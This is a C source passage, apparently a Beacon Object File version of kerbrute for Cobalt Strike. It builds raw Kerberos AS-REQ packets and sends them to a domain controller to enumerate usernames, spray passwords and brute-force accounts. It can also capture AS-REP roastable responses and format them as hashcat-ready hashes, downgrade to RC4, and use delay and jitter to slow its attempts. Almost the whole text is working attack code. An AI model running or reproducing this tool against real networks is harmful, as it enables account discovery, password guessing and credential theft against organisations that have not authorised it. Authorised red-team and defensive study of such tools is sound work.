    int   einlen = downgrade ? (int)sizeof(etin_rc4) : (int)sizeof(etin_full);
    BYTE ets[16]; int etsl=dtlv(ets,0x30,etin,einlen);
    BYTE etc[20]; int etcl=dtlv(etc,0xa8,ets,etsl);

    LARGE_INTEGER q; KERNEL32$QueryPerformanceCounter(&q);
    BYTE nc[]={0x02,0x04,(BYTE)(q.LowPart>>24),(BYTE)(q.LowPart>>16),(BYTE)(q.LowPart>>8),(BYTE)q.LowPart};
    BYTE ncc[12]; int nccl=dtlv(ncc,0xa7,nc,sizeof(nc));

    BYTE tillv[]={0x18,0x0f,'9','9','9','9','1','2','3','1','2','3','5','9','5','9','Z'};
    BYTE tillc[24]; int tlcl=dtlv(tillc,0xa5,tillv,sizeof(tillv));

    BYTE snt[]={0x02,0x01,0x02}; BYTE sntc[8]; int snnl=dtlv(sntc,0xa0,snt,sizeof(snt));
    BYTE sns[300]; int snso=0;
    snso+=dtlv(sns+snso,0x1b,(BYTE*)"krbtgt",6);
    snso+=dtlv(sns+snso,0x1b,realm,rl);
    BYTE snss[310]; int snnss=dtlv(snss,0x30,sns,snso);
    BYTE snsc[320]; int snnsc=dtlv(snsc,0xa1,snss,snnss);
    BYTE snin[400]; int sni=0;
    Memcpy(snin,sntc,snnl); sni+=snnl;
    Memcpy(snin+sni,snsc,snnsc); sni+=snnsc;
    BYTE snseq[410]; int snsl=dtlv(snseq,0x30,snin,sni);
    BYTE snctx[420]; int sncl=dtlv(snctx,0xa3,snseq,snsl);

    BYTE rgs[150]; int rgsl=dtlv(rgs,0x1b,realm,rl);
    BYTE rgc[160]; int rgcl=dtlv(rgc,0xa2,rgs,rgsl);

    BYTE cnt[]={0x02,0x01,0x01}; BYTE cntc[8]; int cnnl=dtlv(cntc,0xa0,cnt,sizeof(cnt));
    BYTE cns[300]; int cnso=dtlv(cns,0x1b,(BYTE*)username,ul);
    BYTE cnss[310]; int cnnss=dtlv(cnss,0x30,cns,cnso);
    BYTE cnsc[320]; int cnnsc=dtlv(cnsc,0xa1,cnss,cnnss);
    BYTE cnin[400]; int cni=0;
    Memcpy(cnin,cntc,cnnl); cni+=cnnl;
    Memcpy(cnin+cni,cnsc,cnnsc); cni+=cnnsc;
    BYTE cnseq[410]; int cnsl=dtlv(cnseq,0x30,cnin,cni);
    BYTE cnctx[420]; int cncl=dtlv(cnctx,0xa1,cnseq,cnsl);

    BYTE opc[16]; int opcl=dtlv(opc,0xa0,opts,sizeof(opts));

    BYTE body[1500]; int bi=0;
    Memcpy(body+bi,opc,opcl);    bi+=opcl;
    Memcpy(body+bi,cnctx,cncl);  bi+=cncl;
    Memcpy(body+bi,rgc,rgcl);    bi+=rgcl;
    Memcpy(body+bi,snctx,sncl);  bi+=sncl;
    Memcpy(body+bi,tillc,tlcl);  bi+=tlcl;
    Memcpy(body+bi,ncc,nccl);    bi+=nccl;
    Memcpy(body+bi,etc,etcl);    bi+=etcl;
    BYTE bseq[1520]; int bsl=dtlv(bseq,0x30,body,bi);
    BYTE bctx[1530]; int bcl=dtlv(bctx,0xa4,bseq,bsl);

    BYTE kreq[2048]; int ki=0;
    BYTE pvno[]={0x02,0x01,0x05}; ki+=dtlv(kreq+ki,0xa1,pvno,sizeof(pvno));
    BYTE msgt[]={0x02,0x01,0x0a}; ki+=dtlv(kreq+ki,0xa2,msgt,sizeof(msgt));
    if (padata&&padatalen>0){
        BYTE pdc[600]; int pdcl=dtlv(pdc,0xa3,padata,padatalen);
        Memcpy(kreq+ki,pdc,pdcl); ki+=pdcl;}
    Memcpy(kreq+ki,bctx,bcl); ki+=bcl;
    BYTE kseq[2060]; int ksl=dtlv(kseq,0x30,kreq,ki);
    int total=dtlv(buf,APP_AS_REQ,kseq,ksl);
    return total>bsz?-1:total;
}

/* ── Parse KRB-ERROR → error-code, or -1 ─────────────────────────────────── */
static int parse_krb_error(const BYTE *r, int len) {
    if (len<4||r[0]!=APP_KRB_ERR) return -1;
    int pos=1;
    if (r[pos]&0x80) pos+=(r[pos]&0x7f)+1; else pos++;
    if (pos>=len||r[pos]!=0x30) return -1; pos++;
    if (r[pos]&0x80) pos+=(r[pos]&0x7f)+1; else pos++;
    while (pos+2<len) {
        BYTE tag=r[pos++]; int clen;
        if (r[pos]&0x80){int lb=r[pos]&0x7f;clen=0;pos++;for(int i=0;i<lb&&pos<len;i++)clen=(clen<<8)|r[pos++];}
        else clen=r[pos++];
        /* error-code is field [6] = 0xa6 */
        if (tag==0xa6&&clen>=3&&pos+2<len&&r[pos]==0x02){
            int il=r[pos+1];
            if (il==1) return r[pos+2];
            if (il==2&&pos+3<len) return (r[pos+2]<<8)|r[pos+3];}
        pos+=clen;
    }
    return -1;
}

/* ── Parse dotted-decimal IP (no Winsock dependency) ─────────────────────── */
static u_long ipv4_parse(const char *s) {
    u_long a=0,b=0,cc=0,d=0;
    const char *p=s;
    while (*p>='0'&&*p<='9'){a=a*10+(*p-'0');p++;} if (*p++!='.') return 0xFFFFFFFF;
    while (*p>='0'&&*p<='9'){b=b*10+(*p-'0');p++;} if (*p++!='.') return 0xFFFFFFFF;
    while (*p>='0'&&*p<='9'){cc=cc*10+(*p-'0');p++;} if (*p++!='.') return 0xFFFFFFFF;
    while (*p>='0'&&*p<='9'){d=d*10+(*p-'0');p++;}
    if (*p||a>255||b>255||cc>255||d>255) return 0xFFFFFFFF;
    return (u_long)(a|(b<<8)|(cc<<16)|(d<<24));
}
#define KRB_PORT_NBO ((u_short)0x5800)  /* htons(88) */

/* ── TCP to KDC:88 ───────────────────────────────────────────────────────── */
static int krb_transact(const char *dc, const BYTE *req, int rlen, BYTE *resp, int max) {
    struct sockaddr_in addr;
    Memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = KRB_PORT_NBO;

    u_long ip = ipv4_parse(dc);
    if (ip != 0xFFFFFFFF) {
        addr.sin_addr.s_addr = ip;
    } else {
        ADDRINFOA hints, *res = NULL;
        Memset(&hints, 0, sizeof(hints));
        hints.ai_family=AF_INET; hints.ai_socktype=SOCK_STREAM; hints.ai_protocol=IPPROTO_TCP;
        if (WS2_32$getaddrinfo(dc, "88", &hints, &res) != 0) return -1;
        addr = *(struct sockaddr_in *)res->ai_addr;
        addr.sin_port = KRB_PORT_NBO;
        WS2_32$freeaddrinfo(res);
    }

    SOCKET s = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return -2;

    DWORD tv = 5000;
    WS2_32$setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,(char*)&tv,sizeof(tv));
    WS2_32$setsockopt(s,SOL_SOCKET,SO_SNDTIMEO,(char*)&tv,sizeof(tv));

    if (WS2_32$connect(s,(struct sockaddr*)&addr,sizeof(addr))!=0){WS2_32$closesocket(s);return -3;}

    BYTE lp[4]={(BYTE)(rlen>>24),(BYTE)(rlen>>16),(BYTE)(rlen>>8),(BYTE)rlen};
    WS2_32$send(s,(char*)lp,4,0); WS2_32$send(s,(char*)req,rlen,0);

    BYTE rl[4]={0}; int got=0;
    while (got<4){int r=WS2_32$recv(s,(char*)rl+got,4-got,0);if(r<=0){WS2_32$closesocket(s);return -4;}got+=r;}

    int resplen=((int)rl[0]<<24)|((int)rl[1]<<16)|((int)rl[2]<<8)|(int)rl[3];
    if (resplen<=0||resplen>max){WS2_32$closesocket(s);return -5;}

    got=0;
    while (got<resplen){int r=WS2_32$recv(s,(char*)resp+got,resplen-got,0);if(r<=0){WS2_32$closesocket(s);return -6;}got+=r;}
    WS2_32$closesocket(s);
    return got;
}

/* ── Trim ─────────────────────────────────────────────────────────────────── */
static char *trim(char *s) {
    while (*s==' '||*s=='\t'||*s=='\r') s++;
    int n=Strlen(s);
    while (n>0&&(s[n-1]=='\r'||s[n-1]==' '||s[n-1]=='\t')) n--;
    s[n]=0; return s;
}

/* ── Hex helpers ─────────────────────────────────────────────────────────── */

static void bytes_to_hex(const BYTE *in, int len, char *out) {
    static const char hx[] = "0123456789abcdef";
    for (int i = 0; i < len; i++) {
        out[i*2]   = hx[in[i] >> 4];
        out[i*2+1] = hx[in[i] & 0xf];
    }
    out[len * 2] = 0;
}

static void str_cat(char *buf, int *pos, int max, const char *s) {
    while (*s && *pos < max - 1) buf[(*pos)++] = *s++;
    if (*pos < max) buf[*pos] = 0;
}

/*
 * Parse the enc-part of an AS-REP and format as a hashcat-ready hash.
 *
 * Etype 23 (RC4):
 *   $krb5asrep$23$user@REALM:checksum$data      (hashcat mode 18200)
 *   — checksum = first 16 cipher bytes (hex)
 *   — data     = remaining cipher bytes (hex)
 *
 * Etype 18 (AES-256) / 17 (AES-128):
 *   $krb5asrep$18$user@REALM:cipher_hex          (hashcat mode 19700)
 *   $krb5asrep$17$user@REALM:cipher_hex          (hashcat mode 19600)
 *
 * Returns bytes written to out (not counting NUL), or -1 on parse error.
 */
static int extract_asrep_hash(const BYTE *r, int rlen,
                               const char *username, const char *domain,
                               char *out, int outmax) {
    if (rlen < 4 || r[0] != APP_AS_REP) return -1;

    /* Skip [APPLICATION 11] (0x6b) + length */
    int pos = 1;
    if (r[pos] & 0x80) pos += (r[pos] & 0x7f) + 1; else pos++;

    /* Skip outer SEQUENCE + length */
    if (pos >= rlen || r[pos] != 0x30) return -1; pos++;
    if (r[pos] & 0x80) pos += (r[pos] & 0x7f) + 1; else pos++;

    /* Walk context fields looking for [6] enc-part (tag 0xa6) */
    while (pos + 2 < rlen) {
        BYTE tag = r[pos++];
        int  flen;
        if (r[pos] & 0x80) {
            int lb = r[pos] & 0x7f; flen = 0; pos++;
            for (int i = 0; i < lb && pos < rlen; i++) flen = (flen << 8) | r[pos++];
        } else { flen = r[pos++]; }

        if (tag == 0xa6) {
            /* Found enc-part — skip its inner SEQUENCE header */
            int ep = pos;
            if (ep >= rlen || r[ep] != 0x30) return -1; ep++;
            if (r[ep] & 0x80) ep += (r[ep] & 0x7f) + 1; else ep++;

            int ep_end      = pos + flen;
            int etype       = -1;
            const BYTE *cipher = NULL;
            int cipher_len  = 0;

            /* Walk EncryptedData fields for [0] etype and [2] cipher */
            while (ep + 2 < ep_end && ep < rlen) {
                BYTE etag = r[ep++];
                int  elen;
                if (r[ep] & 0x80) {
                    int lb = r[ep] & 0x7f; elen = 0; ep++;
                    for (int i = 0; i < lb && ep < rlen; i++) elen = (elen << 8) | r[ep++];
                } else { elen = r[ep++]; }

                if (etag == 0xa0 && elen >= 3 && ep + 2 < rlen && r[ep] == 0x02) {
                    /* [0] etype INTEGER */
                    int il = r[ep + 1];
                    if      (il == 1 && ep + 2 < rlen) etype = r[ep + 2];
                    else if (il == 2 && ep + 3 < rlen) etype = (r[ep+2] << 8) | r[ep+3];
                } else if (etag == 0xa2) {
                    /* [2] cipher — OCTET STRING inside */
                    int ip = ep;
                    if (ip < rlen && r[ip] == 0x04) {
                        ip++;
                        int cl;
                        if (r[ip] & 0x80) {
                            int lb = r[ip] & 0x7f; cl = 0; ip++;
                            for (int i = 0; i < lb && ip < rlen; i++) cl = (cl << 8) | r[ip++];
                        } else { cl = r[ip++]; }
                        cipher     = r + ip;
                        cipher_len = cl;
                    }
                }
                ep += elen;
            }

            if (etype < 0 || !cipher || cipher_len == 0) return -1;

            /* Uppercase realm for the hash */
            char realm[128]; Memset(realm, 0, 128);
            int dl = Strlen(domain);
            for (int i = 0; i < dl && i < 127; i++) {
                char c2 = domain[i];
                realm[i] = (c2 >= 'a' && c2 <= 'z') ? c2 - 0x20 : c2;
            }

            /* Build hash string */
            int o = 0;
            str_cat(out, &o, outmax, "$krb5asrep$");
            if      (etype == 23) str_cat(out, &o, outmax, "23");
            else if (etype == 18) str_cat(out, &o, outmax, "18");
            else if (etype == 17) str_cat(out, &o, outmax, "17");
            else                  str_cat(out, &o, outmax, "??");
            str_cat(out, &o, outmax, "$");
            str_cat(out, &o, outmax, username);
            str_cat(out, &o, outmax, "@");
            str_cat(out, &o, outmax, realm);
            str_cat(out, &o, outmax, ":");

            if (etype == 23 && cipher_len > 16) {
                /* RC4: checksum (first 16 bytes) separated from data by $ */
                char *ck = (char*)Malloc(33);
                bytes_to_hex(cipher, 16, ck);
                str_cat(out, &o, outmax, ck);
                Free(ck);
                str_cat(out, &o, outmax, "$");
                char *rest = (char*)Malloc((cipher_len - 16) * 2 + 1);
                bytes_to_hex(cipher + 16, cipher_len - 16, rest);
                str_cat(out, &o, outmax, rest);
                Free(rest);
            } else {
                /* AES (or short RC4): full cipher hex */
                char *hex = (char*)Malloc(cipher_len * 2 + 1);
                bytes_to_hex(cipher, cipher_len, hex);
                str_cat(out, &o, outmax, hex);
                Free(hex);
            }

            return o;
        }
        pos += flen;
    }
    return -1;   /* enc-part not found */
}

/*
 * ── Core test ──────────────────────────────────────────────────────────────
 *
 * password = NULL  → userenum (unauthenticated AS-REQ)
 * password = str   → authenticated AS-REQ
 *
 * AES-256 is tried first (unless --downgrade).
 * Falls back to RC4-HMAC if ETYPE_NOSUPP or AES key derivation fails.
 *
 * Returns:
 *   1   valid (user exists / correct creds / expired / policy)
 *   0   not found
 *   2   locked / disabled
 *   3   wrong password
 *  -1   network error
 *  -7   unrecognised KRB error (code printed inline)
 */
static int handle_krb_err(int err, const char *username, const char *domain,
                            int have_password) {
    switch (err) {
    case KDC_ERR_PREAUTH_REQUIRED:  return have_password ? 3 : 1;
    case KDC_ERR_PREAUTH_FAILED:    return 3;
    case KDC_ERR_C_PRINCIPAL_UNKNOWN: return 0;
    case KDC_ERR_CLIENT_REVOKED:    return 2;
    case KDC_ERR_KEY_EXPIRED:       return 1;
    case 12: return 1;   /* KDC_ERR_POLICY              */
    case 37: return 1;   /* KDC_ERR_MUST_USE_USER2USER  */
    case 14:             /* KDC_ERR_ETYPE_NOSUPP        */
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] ETYPE_NOSUPP for %s@%s — etype rejected by DC\n", username, domain);
        return 1;
    default:
        BeaconPrintf(CALLBACK_OUTPUT,
            "[?] Unknown KRB error %d: %s@%s\n", err, username, domain);
        return -7;
    }
}

static int test_user(krb_ctx *ctx, const char *username, const char *password) {
    BYTE req[2048], resp[MAX_RESP], padata[512];
    int req_len, rlen, err;

    /* ── Userenum: no pre-auth ── */
    if (!password) {
        req_len = build_as_req(req, sizeof(req), username, ctx->domain,
                               NULL, 0, ctx->downgrade);
        if (req_len < 0) return -1;
        rlen = krb_transact(ctx->dc, req, req_len, resp, MAX_RESP);
        if (rlen <= 0) return -1;
        /* AS-REP without pre-auth = account is AS-REP roastable (return 4) */
        if (resp[0] == APP_AS_REP) {
            if (ctx->roast) {
                char *hash_buf = (char*)Malloc(4096);
                if (extract_asrep_hash(resp, rlen, username, ctx->domain,
                                        hash_buf, 4096) > 0)
                    BeaconPrintf(CALLBACK_OUTPUT, "[HASH] %s\n", hash_buf);
                Free(hash_buf);
            }
            return 4;
        }
        return handle_krb_err(parse_krb_error(resp, rlen), username, ctx->domain, 0);
    }

    /* ── AES-256 path (default, unless --downgrade) ── */
    if (!ctx->downgrade) {
        /* realm uppercase for salt */
        int dl = Strlen(ctx->domain);
        char realm_up[128]; Memset(realm_up, 0, 128);
        for (int i = 0; i < dl && i < 127; i++) {
            char c = ctx->domain[i];
            realm_up[i] = (c >= 'a' && c <= 'z') ? c - 0x20 : c;
        }

        BYTE base_key[32];
        if (str2key_aes256(password, realm_up, username, base_key)) {
            int pdl = build_padata_aes256(padata, sizeof(padata), base_key);
            if (pdl > 0) {
                req_len = build_as_req(req, sizeof(req), username, ctx->domain,
                                       padata, pdl, 0);
                if (req_len > 0) {
                    rlen = krb_transact(ctx->dc, req, req_len, resp, MAX_RESP);
                    if (rlen > 0) {
                        if (resp[0] == APP_AS_REP) return 1;
                        err = parse_krb_error(resp, rlen);
                        /* ETYPE_NOSUPP from AES attempt → fall through to RC4 */
                        if (err == 14) goto try_rc4;
                        return handle_krb_err(err, username, ctx->domain, 1);
                    }
                }
            }
        }
    }

try_rc4:;
    /* ── RC4-HMAC fallback (or --downgrade forced) ── */
    {
        BYTE nthash[16]; nt_hash(password, nthash);
        int pdl = build_padata_rc4(padata, sizeof(padata), nthash);
        if (pdl < 0) return -1;
        req_len = build_as_req(req, sizeof(req), username, ctx->domain,
                               padata, pdl, ctx->downgrade);
        if (req_len < 0) return -1;
        rlen = krb_transact(ctx->dc, req, req_len, resp, MAX_RESP);
        if (rlen <= 0) return -1;
        if (resp[0] == APP_AS_REP) return 1;
        return handle_krb_err(parse_krb_error(resp, rlen), username, ctx->domain, 1);
    }
}

/* ── Per-attempt result handling ─────────────────────────────────────────── */
static int handle_result(krb_ctx *ctx, int result,
                          const char *username, const char *password,
                          int is_userenum) {
    switch (result) {
    case 4:
        /* userenum: account has no pre-auth — hash is capturable (AS-REP roastable) */
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] ASREP ROASTABLE (no pre-auth): %s@%s\n", username, ctx->domain);
        ctx->valid++; break;
    case 1:
        if (is_userenum)
            BeaconPrintf(CALLBACK_OUTPUT,"[+] VALID USER: %s@%s\n", username, ctx->domain);
        else
            BeaconPrintf(CALLBACK_OUTPUT,"[+] VALID LOGIN: %s@%s : %s\n",
                         username, ctx->domain, password ? password : "");
        ctx->valid++; break;
    case 0:
        ctx->notfound++;
        if (ctx->verbose)
            BeaconPrintf(CALLBACK_OUTPUT,"[-] NOT FOUND: %s@%s\n", username, ctx->domain);
        break;
    case 2:
        ctx->locked++;
        BeaconPrintf(CALLBACK_OUTPUT,"[!] LOCKED/DISABLED: %s@%s\n", username, ctx->domain);
        if (ctx->safe) {
            BeaconPrintf(CALLBACK_OUTPUT,"[!] Safe mode — aborting.\n");
            ctx->aborted = 1;
        }
        break;
    case 3:
        if (ctx->verbose)
            BeaconPrintf(CALLBACK_OUTPUT,"[-] WRONG PASSWORD: %s@%s\n", username, ctx->domain);
        break;
    case -7:
        ctx->errors++; break;
    default: {
        ctx->errors++;
        static const char *stages[]={"ok","-1:resolve","-2:socket","-3:connect/port88",
                                      "-4:recv_timeout","-5:bad_resplen","-6:body_recv"};
        int si=(result>=-6&&result<=-1)?-result:0;
        BeaconPrintf(CALLBACK_ERROR,"[!] NETWORK ERROR %s: %s@%s\n",
                     stages[si], username, ctx->domain);
        break; }
    }
    if (ctx->delay > 0 || ctx->jitter > 0) {
        int sleep_ms = ctx->delay;
        if (ctx->jitter > 0) {
            /* Random offset in [-jitter, +jitter] via QPC low bits */
            LARGE_INTEGER _q; KERNEL32$QueryPerformanceCounter(&_q);
            int range = ctx->jitter * 2 + 1;
            int offset = (int)(_q.LowPart % (unsigned)range) - ctx->jitter;
            sleep_ms = ctx->delay + offset;
            if (sleep_ms < 0) sleep_ms = 0;
        }
        Sleep((DWORD)sleep_ms);
    }
    return ctx->aborted;
}

/* ── Line iterator ───────────────────────────────────────────────────────── */
typedef void (*line_cb)(const char *, void *);
static void for_each_line(char *buf, line_cb fn, void *ctx_ptr) {
    char *p=buf;
    while (*p) {
        char *end=p; while (*end&&*end!='\n') end++;
        char save=*end; *end=0;
        char *line=trim(p);
        if (Strlen(line)>0) fn(line, ctx_ptr);
        *end=save; p=(*end)?end+1:end;
    }
}

/* ── Mode callbacks ──────────────────────────────────────────────────────── */
static void cb_userenum(const char *user, void *vctx) {
    krb_ctx *ctx=(krb_ctx*)vctx;
    if (ctx->aborted) return;
    int r=test_user(ctx, user, NULL);
    handle_result(ctx, r, user, NULL, 1);
}

static void cb_spray(const char *user, void *vctx) {
    krb_ctx *ctx=(krb_ctx*)vctx;
    if (ctx->aborted) return;
    int r=test_user(ctx, user, ctx->password);
    handle_result(ctx, r, user, ctx->password, 0);
}

static void cb_bruteuser(const char *pw, void *vctx) {
    krb_ctx *ctx=(krb_ctx*)vctx;
    if (ctx->aborted||ctx->done) return;
    int r=test_user(ctx, ctx->username, pw);
    int stop=handle_result(ctx, r, ctx->username, pw, 0);
    if (r==1||stop) ctx->done=1;
}

static void cb_bruteforce(const char *combo, void *vctx) {
    krb_ctx *ctx=(krb_ctx*)vctx;
    if (ctx->aborted) return;
    char buf[512]; Memset(buf,0,512);
    int clen=Strlen(combo); if (clen>=512) return;
    Memcpy(buf,combo,clen);
    char *colon=buf; while (*colon&&*colon!=':') colon++;
    if (!*colon) return;
    *colon=0;
    char *user=trim(buf), *pw=trim(colon+1);
    if (!Strlen(user)||!Strlen(pw)) return;
    int r=test_user(ctx, user, pw);
    handle_result(ctx, r, user, pw, 0);
}

/* ── BOF entry point ─────────────────────────────────────────────────────── */
void go(char *buffer, int length) {
    datap args;
    BeaconDataParse(&args, buffer, length);
    char *b64    = BeaconDataExtract(&args, NULL);
    char *domain = BeaconDataExtract(&args, NULL);
    char *dc_arg = BeaconDataExtract(&args, NULL);
    char *single = BeaconDataExtract(&args, NULL);
    int   mode   = BeaconDataInt(&args);
    int   delay  = BeaconDataInt(&args);
    int   flags  = BeaconDataInt(&args);
    int   jitter = BeaconDataInt(&args);

    if (!b64||!domain||Strlen(domain)==0) {
        BeaconPrintf(CALLBACK_ERROR,"[kerbrute] Missing required arguments.\n"); return;}

    int b64len=Strlen(b64), decmax=(b64len/4)*3+4;
    char *decoded=(char*)Malloc(decmax+1);
    b64_decode(b64,(BYTE*)decoded,decmax);

    krb_ctx ctx; Memset(&ctx,0,sizeof(ctx));
    ctx.dc        = (dc_arg&&Strlen(dc_arg)>0) ? dc_arg : domain;
    ctx.domain    = domain;
    ctx.password  = single;
    ctx.username  = single;
    ctx.delay     = delay;
    ctx.jitter    = jitter;
    ctx.downgrade = (flags&FLAG_DOWNGRADE)!=0;
    ctx.safe      = (flags&FLAG_SAFE)!=0;
    ctx.verbose   = (flags&FLAG_VERBOSE)!=0;
    ctx.roast     = (flags&FLAG_ROAST)!=0;

    static const char *mnames[]={"userenum","passwordspray","bruteuser","bruteforce"};
    BeaconPrintf(CALLBACK_OUTPUT,
        "[kerbrute] mode=%s  domain=%s  dc=%s  delay=%dms  jitter=%dms  aes=%s  downgrade=%s  safe=%s  verbose=%s  roast=%s\n",
        (mode>=0&&mode<=3)?mnames[mode]:"?", domain, ctx.dc, delay, ctx.jitter,
        ctx.downgrade?"no":"yes",
        ctx.downgrade?"yes":"no",
        ctx.safe?"yes":"no",
        ctx.verbose?"yes":"no",
        ctx.roast?"yes":"no");

    switch (mode) {
    case MODE_USERENUM:
        for_each_line(decoded, cb_userenum, &ctx); break;
    case MODE_SPRAY:
        if (!single||Strlen(single)==0){BeaconPrintf(CALLBACK_ERROR,"[kerbrute] -p required.\n");break;}
        BeaconPrintf(CALLBACK_OUTPUT,"[kerbrute] Spraying: %s\n", single);
        for_each_line(decoded, cb_spray, &ctx); break;
    case MODE_BRUTEUSER:
        if (!single||Strlen(single)==0){BeaconPrintf(CALLBACK_ERROR,"[kerbrute] -u required.\n");break;}
        BeaconPrintf(CALLBACK_OUTPUT,"[kerbrute] Target: %s@%s\n", single, domain);
        for_each_line(decoded, cb_bruteuser, &ctx); break;
    case MODE_BRUTEFORCE:
        for_each_line(decoded, cb_bruteforce, &ctx); break;
    default:
        BeaconPrintf(CALLBACK_ERROR,"[kerbrute] Unknown mode: %d\n", mode); break;
    }

    if (ctx.aborted)
        BeaconPrintf(CALLBACK_OUTPUT,"[kerbrute] Aborted (safe mode).\n");
    BeaconPrintf(CALLBACK_OUTPUT,
        "[kerbrute] Done — valid: %d  not-found: %d  locked: %d  errors: %d\n",
        ctx.valid, ctx.notfound, ctx.locked, ctx.errors);

    Free(decoded);
}
